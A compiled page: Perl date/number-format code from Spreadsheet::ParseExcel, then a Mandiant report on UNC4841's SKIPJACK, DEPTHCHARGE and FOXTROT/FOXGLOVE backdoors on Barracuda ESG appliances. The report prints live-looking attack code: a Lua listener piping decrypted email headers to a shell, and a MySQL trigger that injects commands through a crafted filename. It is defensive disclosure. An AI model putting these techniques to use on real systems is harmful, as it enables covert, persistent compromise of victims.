 # For this case 'm' is minutes not months. push @placeholders, [ 'mm', length($token), 2, 'minutes' ]; } else { push @placeholders, [ substr( $format, $pos, 2 ), length($token), 2 ]; } if ( ( substr( $format, $pos, 2 ) eq 'ss' ) && ( @placeholders > 1 ) ) { if ( ( $placeholders[-2]->[0] eq 'm' ) || ( $placeholders[-2]->[0] eq 'mm' ) ) {
 # For this case 'm' is minutes not months. push( @{ $placeholders[-2] }, 'minutes' ); } } $pos += 2; } elsif (( substr( $format, $pos, 1 ) eq 'm' ) || ( substr( $format, $pos, 1 ) eq 'd' ) || ( substr( $format, $pos, 1 ) eq 'h' ) || ( substr( $format, $pos, 1 ) eq 's' ) ) { if ( ( substr( $format, $pos, 1 ) eq 'm' ) && (@placeholders) && ( ( $placeholders[-1]->[0] eq 'h' ) or ( $placeholders[-1]->[0] eq 'hh' ) ) ) {
 # For this case 'm' is minutes not months. push @placeholders, [ 'm', length($token), 1, 'minutes' ]; } else { push @placeholders, [ substr( $format, $pos, 1 ), length($token), 1 ]; } if ( ( substr( $format, $pos, 1 ) eq 's' ) && ( @placeholders > 1 ) ) { if ( ( $placeholders[-2]->[0] eq 'm' ) || ( $placeholders[-2]->[0] eq 'mm' ) ) {
 # For this case 'm' is minutes not months. push( @{ $placeholders[-2] }, 'minutes' ); } } $pos += 1; } } elsif ( ( substr( $format, $pos, 3 ) eq '[h]' ) ) { $format\_mode = 'date' unless $format\_mode; push @placeholders, [ '[h]', length($token), 3 ]; $pos += 3; } elsif ( ( substr( $format, $pos, 4 ) eq '[mm]' ) ) { $format\_mode = 'date' unless $format\_mode; push @placeholders, [ '[mm]', length($token), 4 ]; $pos += 4; } elsif ( $char eq '@' ) { push @placeholders, [ '@', length($token), 1 ]; $pos++; } elsif ( $char eq '\*' ) { push @placeholders, [ substr( $format, $pos, 1 ), length($token), 1 ]; } else { $pos++; } $pos++ if ( $pos == $start\_pos ); #No Format match $token .= substr( $format, $start\_pos, $pos - $start\_pos );
 } # End of parsing.
 # Copy the located format string to a result string that we will perform # the substitutions on and return to the user. my $result = $token;
 # Add a placeholder between the decimal/comma and end of the token, if any. if ( $token\_start != -1 ) { push @placeholders, [ substr( $format, $token\_start, $pos - $token\_start + 1 ), $decimal\_pos, $pos - $token\_start + 1 ]; }
 # # In the next sections we process date, number and text formats. We take a # format such as yyyy/mm/dd and replace it with something like 2008/12/25. # if ( ( $format\_mode eq 'date' ) && ( $number =~ $qrNUMBER ) ) {
 # The maximum allowable date in Excel is 9999-12-31T23:59:59.000 which # equates to 2958465.999+ in the 1900 epoch and 2957003.999+ in the # 1904 epoch. We use 0 as the minimum in both epochs. The 1904 system # actually supports negative numbers but that isn't worth the effort. my $min\_date = 0; my $max\_date = 2958466; $max\_date = 2957004 if $is\_1904;
 if ( $number < $min\_date || $number >= $max\_date ) { return $number; # Return unformatted number. }
 # Process date formats. my @time = ExcelLocaltime( $number, $is\_1904 );
 # 0 1 2 3 4 5 6 7 my ( $sec, $min, $hour, $day, $month, $year, $wday, $msec ) = @time;
 $month++; # localtime() zero indexed month. $year += 1900; # localtime() year.
 my @full\_month\_name = qw( None January February March April May June July August September October November December ); my @short\_month\_name = qw( None Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec ); my @full\_day\_name = qw( Sunday Monday Tuesday Wednesday Thursday Friday Saturday ); my @short\_day\_name = qw( Sun Mon Tue Wed Thu Fri Sat );
 # Replace the placeholders in the template such as yyyy mm dd with # actual numbers or strings. my $replacement; for ( my $i = @placeholders - 1 ; $i >= 0 ; $i-- ) { my $placeholder = $placeholders[$i];
 if ( $placeholder->[-1] eq 'minutes' ) {
 # For this case 'm/mm' is minutes not months. if ( $placeholder->[0] eq 'mm' ) { $replacement = sprintf( "%02d", $min ); } else { $replacement = sprintf( "%d", $min ); } } elsif ( $placeholder->[0] eq 'yyyy' ) {
 # 4 digit Year. 2000 -> 2000. $replacement = sprintf( '%04d', $year ); } elsif ( $placeholder->[0] eq 'yy' ) {
 # 2 digit Year. 2000 -> 00. $replacement = sprintf( '%02d', $year % 100 ); } elsif ( $placeholder->[0] eq 'mmmmm' ) {
 # First character of the month name. 1 -> J. $replacement = substr( $short\_month\_name[$month], 0, 1 ); } elsif ( $placeholder->[0] eq 'mmmm' ) {
 # Full month name. 1 -> January. $replacement = $full\_month\_name[$month]; } elsif ( $placeholder->[0] eq 'mmm' ) {
 # Short month name. 1 -> Jan. $replacement = $short\_month\_name[$month]; } elsif ( $placeholder->[0] eq 'mm' ) {
 # 2 digit month. 1 -> 01. $replacement = sprintf( '%02d', $month ); } elsif ( $placeholder->[0] eq 'm' ) {
 # 1 digit month. 1 -> 1. $replacement = sprintf( '%d', $month ); } elsif ( $placeholder->[0] eq 'dddd' ) {
 # Full day name. Wednesday (for example.) $replacement = $full\_day\_name[$wday]; } elsif ( $placeholder->[0] eq 'ddd' ) {
 # Short day name. Wed (for example.) $replacement = $short\_day\_name[$wday]; } elsif ( $placeholder->[0] eq 'dd' ) {
 # 2 digit day. 1 -> 01. $replacement = sprintf( '%02d', $day ); } elsif ( $placeholder->[0] eq 'd' ) {
 # 1 digit day. 1 -> 1. $replacement = sprintf( '%d', $day ); } elsif ( $placeholder->[0] eq 'hh' ) {
 # 2 digit hour. if ($is\_12\_hour) { my $hour\_tmp = $hour % 12; $hour\_tmp = 12 if $hour % 12 == 0; $replacement = sprintf( '%d', $hour\_tmp ); } else { $replacement = sprintf( '%02d', $hour ); } } elsif ( $placeholder->[0] eq 'h' ) {
 # 1 digit hour. if ($is\_12\_hour) { my $hour\_tmp = $hour % 12; $hour\_tmp = 12 if $hour % 12 == 0; $replacement = sprintf( '%2d', $hour\_tmp ); } else { $replacement = sprintf( '%d', $hour ); } } elsif ( $placeholder->[0] eq 'ss' ) {
 # 2 digit seconds. $replacement = sprintf( '%02d', $sec ); } elsif ( $placeholder->[0] eq 's' ) {
 # 1 digit seconds. $replacement = sprintf( '%d', $sec ); } elsif ( $placeholder->[0] eq 'am/pm' ) {
 # AM/PM. $replacement = ( $hour >= 12 ) ? 'PM' : 'AM'; } elsif ( $placeholder->[0] eq 'a/p' ) {
 # AM/PM. $replacement = ( $hour >= 12 ) ? 'P' : 'A'; } elsif ( $placeholder->[0] eq '.' ) {
 # Decimal point for seconds. $replacement = '.'; } elsif ( $placeholder->[0] =~ /(^0+$)/ ) {
 # Milliseconds. For example h:ss.000. my $length = length($1); $replacement = substr( sprintf( "%.${length}f", $msec / 1000 ), 2, $length ); } elsif ( $placeholder->[0] eq '[h]' ) {
 # Hours modulus 24. 25 displays as 25 not as 1. $replacement = sprintf( '%d', int($number) \* 24 + $hour ); } elsif ( $placeholder->[0] eq '[mm]' ) {
 # Mins modulus 60. 72 displays as 72 not as 12. $replacement = sprintf( '%d', ( int($number) \* 24 + $hour ) \* 60 + $min ); } elsif ( $placeholder->[0] eq 'ge' ) { require Spreadsheet::ParseExcel::FmtJapan; # Japanese Nengo (aka Gengo) in initialism (abbr. name) $replacement = Spreadsheet::ParseExcel::FmtJapan::CnvNengo( abbr\_name => @time ); } elsif ( $placeholder->[0] eq 'ggge' ) { require Spreadsheet::ParseExcel::FmtJapan; # Japanese Nengo (aka Gengo) in Kanji (full name) $replacement = Spreadsheet::ParseExcel::FmtJapan::CnvNengo( name => @time ); } elsif ( $placeholder->[0] eq '@' ) {
 # Text format. $replacement = $number; }
 # Substitute the replacement string back into the template. substr( $result, $placeholder->[1], $placeholder->[2], $replacement ); } } elsif ( ( $format\_mode eq 'number' ) && ( $number =~ $qrNUMBER ) ) {
 # Process non date formats. if (@placeholders) { while ( $placeholders[-1]->[0] eq ',' ) { $comma\_count--; substr( $result, $placeholders[-1]->[1], $placeholders[-1]->[2], '' ); $number /= 1000; pop @placeholders; }
 my $number\_format = join( '', map { $\_->[0] } @placeholders ); my $number\_result; my $str\_length = 0; my $engineering = 0; my $is\_decimal = 0; my $is\_integer = 0; my $after\_decimal = undef;
 for my $token ( split //, $number\_format ) { if ( $token eq '.' ) { $str\_length++; $is\_decimal = 1; } elsif ( ( $token eq 'E' ) || ( $token eq 'e' ) ) { $engineering = 1; } elsif ( $token eq '0' ) { $str\_length++; $after\_decimal++ if $is\_decimal; $is\_integer = 1; } elsif ( $token eq '#' ) { $after\_decimal++ if $is\_decimal; $is\_integer = 1; } elsif ( $token eq '?' ) { $after\_decimal++ if $is\_decimal; } }
 $number \*= 100.0 if $is\_percent;
 my $data = ($is\_currency) ? abs($number) : $number + 0;
 if ($is\_fraction) { $number\_result = sprintf( "%0${str\_length}d", int($data) ); } else { if ($is\_decimal) {
 if ( defined $after\_decimal ) { $number\_result = sprintf "%0${str\_length}.${after\_decimal}f", $data; } else { $number\_result = sprintf "%0${str\_length}f", $data; }
 # Fix for Perl and sprintf not rounding up like Excel. # http://rt.cpan.org/Public/Bug/Display.html?id=45626 if ( $data =~ /^${number\_result}5/ ) { $number\_result = sprintf "%0${str\_length}.${after\_decimal}f", $data . '1'; } } else { $number\_result = sprintf( "%0${str\_length}.0f", $data ); } }
 $number\_result = AddComma($number\_result) if $comma\_count > 0;
 my $number\_length = length($number\_result); my $decimal\_pos = -1; my $replacement;
 for ( my $i = @placeholders - 1 ; $i >= 0 ; $i-- ) { my $placeholder = $placeholders[$i];
 if ( $placeholder->[0] =~ /([#0]\*)([\.]?)([0#]\*)([eE])([\+\-])([0#]+)/ ) { substr( $result, $placeholder->[1], $placeholder->[2], MakeE( $placeholder->[0], $number ) ); } elsif ( $placeholder->[0] =~ /\// ) { substr( $result, $placeholder->[1], $placeholder->[2], MakeFraction( $placeholder->[0], $number, $is\_integer ) ); } elsif ( $placeholder->[0] eq '.' ) { $number\_length--; $decimal\_pos = $number\_length; } elsif ( $placeholder->[0] eq '+' ) { substr( $result, $placeholder->[1], $placeholder->[2], ( $number > 0 ) ? '+' : ( ( $number == 0 ) ? '+' : '-' ) ); } elsif ( $placeholder->[0] eq '-' ) { substr( $result, $placeholder->[1], $placeholder->[2], ( $number > 0 ) ? '' : ( ( $number == 0 ) ? '' : '-' ) ); } elsif ( $placeholder->[0] eq '@' ) { substr( $result, $placeholder->[1], $placeholder->[2], $number ); } elsif ( $placeholder->[0] eq '\*' ) { substr( $result, $placeholder->[1], $placeholder->[2], '' ); } elsif (( $placeholder->[0] eq "\xA2\xA4" ) or ( $placeholder->[0] eq "\xA2\xA5" ) or ( $placeholder->[0] eq "\x81\xA2" ) or ( $placeholder->[0] eq "\x81\xA3" ) ) { substr( $result, $placeholder->[1], $placeholder->[2], $placeholder->[0] ); } elsif (( $placeholder->[0] eq '(' ) or ( $placeholder->[0] eq ')' ) ) { substr( $result, $placeholder->[1], $placeholder->[2], $placeholder->[0] ); } else { if ( $number\_length > 0 ) { if ( $i <= 0 ) { $replacement = substr( $number\_result, 0, $number\_length ); $number\_length = 0; } else { my $real\_part\_length = length( $placeholder->[0] ); if ( $decimal\_pos >= 0 ) { my $format = $placeholder->[0]; $format =~ s/^#+//; $real\_part\_length = length $format; $real\_part\_length = ( $number\_length <= $real\_part\_length ) ? $number\_length : $real\_part\_length; } else { $real\_part\_length = ( $number\_length <= $real\_part\_length ) ? $number\_length : $real\_part\_length; } $replacement = substr( $number\_result, $number\_length - $real\_part\_length, $real\_part\_length ); $number\_length -= $real\_part\_length; } } else { $replacement = ''; } substr( $result, $placeholder->[1], $placeholder->[2], "\x00" . $replacement ); } } $replacement = ( $number\_length > 0 ) ? substr( $number\_result, 0, $number\_length ) : ''; $result =~ s/\x00/$replacement/; $result =~ s/\x00//g; } } else {
 # Process text formats my $is\_text = 0; for ( my $i = @placeholders - 1 ; $i >= 0 ; $i-- ) { my $placeholder = $placeholders[$i]; if ( $placeholder->[0] eq '@' ) { substr( $result, $placeholder->[1], $placeholder->[2], $number ); $is\_text++; } else { substr( $result, $placeholder->[1], $placeholder->[2], '' ); } }
 $result = $number unless $is\_text;
 } # End of placeholder substitutions.
 # Trim the leading and trailing whitespace from the results. $result =~ s/^\s+//; $result =~ s/\s+$//;
 # Fix for negative currency. $result =~ s/^\$\-/\-\$/; $result =~ s/^\$ \-/\-\$ /;
 # Return color and locale strings if required. if ($want\_subformats) { return ( $result, $color, $locale ); } else { return $result; }}
#------------------------------------------------------------------------------# AddComma (for Spreadsheet::ParseExcel::Utility)#------------------------------------------------------------------------------sub AddComma { my ($sNum) = @\_;
 if ( $sNum =~ /^([^\d]\*)(\d\d\d\d+)(\.\*.\*)$/ ) { my ( $sPre, $sObj, $sAft ) = ( $1, $2, $3 ); for ( my $i = length($sObj) - 3 ; $i > 0 ; $i -= 3 ) { substr( $sObj, $i, 0, ',' ); } return $sPre . $sObj . $sAft; } else { return $sNum; }}
#------------------------------------------------------------------------------# MakeFraction (for Spreadsheet::ParseExcel::Utility)#------------------------------------------------------------------------------sub MakeFraction { my ( $sFmt, $iData, $iFlg ) = @\_; my $iBunbo; my $iShou;
 #1. Init # print "FLG: $iFlg\n"; if ($iFlg) { $iShou = $iData - int($iData); return '' if ( $iShou == 0 ); } else { $iShou = $iData; } $iShou = abs($iShou);[View remainder of file in raw view](https://github.com/jmcnamara/spreadsheet-parseexcel/raw/c7298592e102a375d43150cd002feed806557c15/lib/Spreadsheet/ParseExcel/Utility.pm)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.mandiant.com_050d5cc3_20250115_133956.html ===
Threat Intelligence
# Diving Deep into UNC4841 Operations Following Barracuda ESG Zero-Day Remediation (CVE-2023-2868)

August 29, 2023

##### Mandiant

Written by: Austin Larsen, John Palmisano, John Wolfram, Mathew Potaczek, Michael Raggi

---

*UPDATE (Aug. 21, 2024): This post has been updated to remove four indicators of compromise (IOC) in the Domains section. Based on further research, we have determined that there was insufficent evidence to confirm if these IOCs were related to this campaign.*

On June 15, 2023, Mandiant released [a blog post](https://cloud.google.com/blog/topics/threat-intelligence/barracuda-esg-exploited-globally) detailing an 8-month-long global espionage campaign conducted by a Chinese-nexus threat group tracked as UNC4841. In this follow-up blog post, we will detail additional tactics, techniques, and procedures (TTPs) employed by UNC4841 that have since been uncovered through Mandiant’s incident response engagements, as well as through collaborative efforts with Barracuda Networks and our International Government partners.

Over the course of this blog post, Mandiant will detail how UNC4841 has continued to show sophistication and adaptability in response to remediation efforts. Specifically, UNC4841 deployed new and novel malware designed to maintain presence at a small subset of high priority targets that it compromised either before the patch was released, or shortly following Barracuda’s remediation guidance. We’ll also showcase how UNC4841’s deployment select backdoors suggests this threat actor anticipated, and prepared for remediation efforts, by creating tooling in advance to remain embedded in high-value targets, should the campaign be compromised.

Furthermore, Mandiant will provide additional insights into the overall campaign timeline as well as a deeper look into UNC4841’s targeting, as observed through investigations at downstream customers, further strengthening the case for ties between UNC4841 and the People’s Republic of China.

Since Barracuda [released](https://www.barracuda.com/company/legal/esg-vulnerability) a patch to ESG appliances on May 20, 2023, Mandiant and Barracuda have not identified evidence of successful exploitation of CVE-2023-2868 resulting in any newly compromised physical or virtual ESG appliances. Only a limited number of ESG appliances worldwide were compromised (5% of ESG appliances), and impacted customers have been notified to replace the appliances. No other Barracuda product, including Barracuda’s SaaS email solutions, were impacted by this vulnerability.

Mandiant and Barracuda investigations into previously compromised appliances confirmed UNC4841 deployed additional malware to a subset of devices and conducted additional post-exploitation activities.

Mandiant assesses that, at the time of writing, a limited number of previously impacted victims remain at risk due to this campaign. UNC4841 has shown an interest in a subset of priority victims - it is on these victim’s appliances that additional malware, such as the backdoor DEPTHCHARGE, was deployed to maintain persistence in response to remediation efforts. Mandiant and Barracuda have reached out to individual victims where such activity has been identified. Mandiant’s recommendations remain unchanged — victims impacted by this campaign should contact Barracuda [support](https://www.barracuda.com/support/contact) and replace the compromised appliance.

## Campaign Timeline

Since our initial blog post, Mandiant has assembled and analyzed an exhaustive timeline of all identified UNC4841 activity observed at victims impacted by the successful exploitation of CVE-2023-2868. As depicted in Figure 1, the campaign spanned the timeframe between October 2022 and June 2023, with an initial surge of CVE-2023-2868 exploitation activity occurring in early November 2022.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig1_zaee.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig1_zaee.max-1400x1400.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig1_zaee.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig1_zaee.max-1400x1400.png)

Figure 1: Identified UNC4841 activity (blue) and victims (red) over the duration of the campaign

Through our analysis of the campaign, Mandiant identified a distinct fall off in activity from approximately January 20 to January 22, 2023, a period that coincides with the beginning of the Chinese New Year — a national holiday observed within the People’s Republic of China. Additionally, further analysis of the timeline identified two surges in activity that followed Barracuda’s initial remediation efforts and public notification on May 23, 2023. The first surge occurred in the days immediately following the notification, where the actor retooled malware and changed persistence methods as detailed in our previous blog. This was followed by a second, previously undisclosed wave, that began in early June 2023. In this second wave, Mandiant discovered the actor attempting to maintain access to compromised environments via the deployment of the new malware families SKIPJACK, DEPTHCHARGE, and FOXTROT / FOXGLOVE. This second surge represented the highest intensity of UNC4841 activity identified by Mandiant across the entire campaign, demonstrating UNC4841’s determination in preserving access to specific victim environments.

## Targeted Tooling

UNC4841 is a well-resourced actor that has utilized a wide range of malware and purpose-built tooling to enable their global espionage operations. One theme that has become apparent as our investigation has progressed is the selective deployment of specific malware families at high priority targets. The three code families we have observed being selectively deployed are SKIPJACK, DEPTHCHARGE, and FOXTROT / FOXGLOVE. Each of these malware families represent a level of increasing selectivity in their deployment.

### SKIPJACK

SKIPJACK is a passive backdoor implemented by trojanizing legitimate Barracuda ESG modules by injecting malicious Lua code. Through the injected code, SKIPJACK establishes its backdoor capabilities by registering a listener for specific incoming email headers and subjects, and then decoding and executing the content of them. Mandiant has observed variations of SKIPJACK that utilize both the Content-ID and X-Barracuda-Spam-Info email header fields, an example of which can be seen in the following code snippet.

```
if hdr:name() == "Content-ID" then
        if hdr:body() ~= nil then
                if string.match(hdr:body(), "^[%w%+/=\r\n]+$") then
                        io.popen("echo " " .. hdr:body() .. "" | openssl aes-256-cbc -d -A -a -nosalt -K <REDACTED> -iv <REDACTED> 2>/dev/null | base64 -d | sh 2>/dev/null"):close()
                End
        end
end
```
Figure 2: SKIPJACK Listener

As observed in the code snippet, the injected SKIPJACK code inspects whether the Content-ID header exists, and that it contains characters that would be present in a Base64 encoded string. When the condition is met, it proceeds to AES-256 decrypt and Base64 decode the header body, and then pipe the output to a system shell for execution.

Around the time of Barracuda's initial notification regarding CVE-2023-2868, Mandiant observed UNC4841 creating bash scripts on previously compromised appliances with the filename of `mknod` in the path `/boot/os\_tools/`. The `mknod` bash script checks whether the `mod\_content.lua` script on the compromised appliance contains the string `OpenSSL`, and if not found, injects the code snippet in Figure 2 into the mod\_content.lua script, effectively backdooring the legitimate Barracuda ESG module.

Of these three malware families, UNC4841 most widely deployed SKIPJACK, which was observed on roughly 5.8 percent of all compromised ESG appliances. UNC4841 primarily targeted government and technology organizations with SKIPJACK; however, multiple other verticals were observed being targeted.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig3-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig3-img.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig3-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig3-img.max-800x800.png)

Figure 3: SKIPJACK sector distribution

Additionally, of all the malware families deployed by UNC4841 in this campaign, Mandiant found that SKIPJACK had the most variants. Although we identified evidence of many different SKIPJACK bash scripts existing on compromised appliances, we were not able to recover all instances of the malware. Based on the samples we did obtain, we suspect that each of these unrecovered variants contained different SKIPJACK code that utilized different sections within an email message to hide its encrypted command and achieve the same functionality.

### DEPTHCHARGE

Another malware family Mandiant observed being selectively deployed by UNC4841 was a passive backdoor we named DEPTHCHARGE. DEPTHCHARGE, which is [tracked by CISA as SUBMARINE](https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors), is packaged as a Linux shared object library, which is pre-loaded into the Barracuda SMTP (BSMTP) daemon using LD\_PRELOAD. DEPTHCHARGE listens passively to receive encrypted commands, which it decrypts with OpenSSL and executes before sending the results, masqueraded as SMTP commands, back to the command and control (C2) server. DEPTHCHARGE is installed and persisted through a complex execution chain, which the actor crafted to enable infection of re-issued or clean appliances when the victim restored backup configurations from a previously compromised device. Figure 4 provides a depiction of the DEPTHCHARGE execution chain.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig4a_ifzz.max-1300x1300.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig4a_ifzz.max-1300x1300.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig4a_ifzz.max-1300x1300.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig4a_ifzz.max-1300x1300.png)

Figure 4: DEPTHCHARGE execution chain

The first stage of the DEPTHCHARGE execution chain existed in a file named `config.TRG`, which defines a malicious trigger (named `cuda` or `cuda\_trigger`) in the MySQL database that stores the configuration for the Barracuda ESG appliance.

```
TYPE=TRIGGERS
triggers='CREATE TRIGGER cuda\nBEFORE DELETE ON config\nFOR EACH ROW\nBEGIN\n    DECLARE i INT;\n    SET i = 1;\n    IF i = 1 THEN\n        SELECT "<base64_payload>” INTO OUTFILE "/var/tmp/r";\n        SELECT "echo
-n Y2F0IC92YXIvdG1wL3IgfCBiYXNlNjQgLWQgLWkgfCB0YXIgLXp4IC1DIC92YXIvdG1wCm5va
HVwIGJhc2ggL3Zhci90bXAvcnVuLnNoICAgMzExNTMgICAgPi9kZXYvbnVsbCAyPiYxICYKcm0gLWYgL3Jvb3QvbWFjaGluZVxgKg== | base64 -d | sh" INTO OUTFILE "/root/machine`echo -n Y2htb2QgK3ggL3Jvb3QvbWFjKlxgKgpzaCAvcm9vdC9tYWMqXGAq | base64 -d |sh`|";\n        SET i = i + 1;\n    END IF;\nEND'
sql_modes=0
definers='root@localhost'
```
Figure 5: DEPTHCHARGE trigger

```
cat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp
nohup bash /var/tmp/run.sh   31153    >/dev/null 2>&1 &
rm -f /root/machine\`*
```
Figure 6: DEPTHCHARGE decoded installer script

The trigger is executed before a row is removed from the configuration database, an action which occurs frequently and at the time of restoration of a previous Barracuda ESG configuration. The first part of the trigger writes a Base64 payload to `/var/tmp/r`; a TAR archive that contains an installer shell script and the final DEPTHCHARGE backdoor payload. The remaining components of the trigger write a script to disk that decompresses this archive, run the installer script inside, and then remove the file on disk. However, it is not possible to execute a script directly from the MySQL trigger. Therefore, in order to execute the installer script, UNC4841 specially crafted a filename that would cause other components of the Barracuda ESG’s codebase that used the [two-argument form of Perl’s open( ) function](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543) to execute commands (shown inside the backticks). Ultimately, this novel approach enabled UNC4841 to achieve command execution from the MySQL trigger and launch the DEPTHCHARGE script. The fact that UNC4841 identified and operationalized this complex execution path suggests that they had extensive knowledge of the device and had researched internal components of the Barracuda ESG appliance.

The installer script `run.sh` is executed with an argument that specifies the DEPTHCHARGE `BSMTP\_ID` configuration value (discussed as follows). The script is responsible for moving the DEPTHCHARGE payload to a legitimate directory on the appliance, and modifying the SMTP configuration file to pre-load the malware with the given BSMTP\_ID configuration value upon execution of the BSMTP daemon. It also creates additional scripts that sleep for two minutes prior to execution, check if the pre-load persistence is present, and install it into the SMTP configuration file if it is not found. To further blend into legitimate activity, some variants of the script were also found to timestomp the malware files by inheriting timestamps from legitimate files on the system using the `touch` command.

The DEPTHCHARGE backdoor can accept incoming TCP connections. It checks if the TCP source port of the client is equal to the value in the `BSMTP\_ID` environment variable, and if so executes its backdoor capability as a Linux daemon. DEPTHCHARGE first connects to the appliance's SMTP port (127.0.0.1:25) to retrieve the appliance’s genuine SMTP banner, which it sends back to the attacker. This is likely used as an SMTP greeting message and to verify the identity of the appliance to which they are connecting.

The malware is then able to receive encrypted commands that masquerade as SMTP EHLO commands, which are preceded with the string “ehlo” followed by a space. The encrypted commands are base64 decoded and AES decrypted with OpenSSL before being executed. The malware sends the results back to the attacker, again masquerading it as SMTP traffic:

```
250-mail2.eccentric.duck Hello <command body> [<client's IP address string>], pleased to meet you
250-SIZE 100000000
250-PIPELINING
250-8BITMIME
250 HELP
```
Figure 7: DEPTHCHARGE SMTP greeting

The SMTP reply sent by DEPTHCHARGE in response to a SMTP EHLO command contains the local hostname of “mail2.eccentric.duck”. This hostname is a hardcoded string and does not relate to any public registered domain name.

It was common practice for impacted victims to export their configuration from compromised appliances so it could be restored into a clean one. Therefore, if the DEPTHCHARGE trigger was present in the exported configuration, it would effectively enable UNC4841 to infect the clean device with the DEPTHCHARGE backdoor through this execution chain, and potentially maintain access even after complete replacement of the appliance. Mandiant and Barracuda Networks identified instances where this may have occurred and notified victims accordingly. Additionally, Mandiant is aware that in some cases, this MySQL configuration database may contain plaintext passwords for user accounts. In these instances, we suspect the actor was harvesting these credentials for lateral movement purposes.

The earliest evidence of UNC4841 deploying DEPTHCHARGE occurred on May 30, 2023, roughly one week after Barracuda’s initial notification. Mandiant observed UNC4841 rapidly deploy DEPTHCHARGE to select targets following Barracuda’s announcement that RMA was the recommended response action. This capability and its deployment suggests that UNC4841 anticipated and was prepared for remediation efforts with tooling and TTPs designed to enable them to persist on high value targets. It also suggests that despite this operation's global coverage, it was not opportunistic, and that UNC4841 had adequate planning and funding to anticipate and prepare for contingencies that could potentially disrupt their access to target networks. Over the course of the investigation to date, Mandiant has identified UNC4841 deploying DEPTHCHARGE to roughly 2.64 percent of compromised appliances. These victims included U.S. and foreign government entities, as well as high tech and information technology providers.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig7-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig7-img.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig7-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig7-img.max-800x800.png)

Figure 8: DEPTHCHARGE sector distribution

### FOXTROT / FOXGLOVE

The final malware family Mandiant observed being selectively deployed by UNC4841 was FOXTROT / FOXGLOVE. FOXGLOVE is a launcher written in C that executes the hardcoded path of FOXTROT. The payload is executed along with additional encrypted arguments for the C2, port, secret key, and jitter. FOXGLOVE uses a combination of Base64, Mod(13), and XOR with a hard-coded key to encrypt arguments.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig8_ckxu.max-1000x1000.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig8_ckxu.max-1000x1000.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig8_ckxu.max-1000x1000.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig8_ckxu.max-1000x1000.png)

Figure 9: FOXGLOVE encryption routine

FOXGLOVE is implemented to be configurable, as the execution path and arguments can easily be changed.

```
/usr/share/foxdoor/foxdoor_shell shell -t <Encrypted C2> -p <Encrypted Port> -s <Encrypted Secret> -r <Jitter>
```
Figure 10: FOXGLOVE execution

FOXTROT is a backdoor written in C++ that communicates via TCP and is able to be used as a proxy. Supported backdoor commands include keystroke capture, shell command execution, reverse shell creation, and file transfer.

FOXTROT contains overlaps to [REPTILE shell open source code](https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/userland/shell.c). FOXTROT notably makes use of the [default sequence](https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/userland/include/config.h#L11C1-L11C34) `;7(Zu9YTsA7qQ#vw` as an acknowledgement token, and to signal session termination. FOXTROT, however, also includes backdoor commands and functionality not present in REPTILE.

FOXTROT and FOXGLOVE are also notable in that they are the only malware families observed being used by UNC4841 that were not specifically designed for Barracuda ESGs. Based on functionality, FOXTROT was likely also intended to be deployed to other Linux-based devices within a network to enable lateral movement and credential theft. Additionally, FOXGLOVE and FOXTROT were the most selectively deployed of all the malware families used by UNC4841. At this time, Mandiant has only observed UNC4841 deploy FOXTROT and FOXGLOVE at government or government related organizations that were high priority targets for the PRC.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig10-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig10-img.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig10-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig10-img.max-800x800.png)

Figure 11: FOXTROT / FOXGLOVE sector distribution

## Lateral Movement

Following Barracuda’s public disclosure of CVE-2023-2868, Mandiant identified UNC4841 performing internal reconnaissance and subsequent lateral movement actions within a limited number of victim environments.

